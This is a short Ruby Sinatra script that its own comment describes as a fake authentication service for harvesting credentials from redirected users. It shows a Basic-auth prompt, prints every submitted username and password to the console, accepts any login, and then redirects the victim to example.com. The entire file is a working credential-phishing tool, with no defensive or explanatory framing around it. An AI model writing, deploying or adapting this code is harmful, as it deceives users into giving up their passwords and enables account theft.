require 'sinatra'

# A fake authentication service used to harvest credentials from redirected users

use Rack::Auth::Basic, "Authentication required" do |username, password|
  puts "Got Creds! User: #{username}, Password: #{password}"
  true
end

get '/' do
  # We are going to redirect the user back to the original page
  redirect 'https://example.com'
end
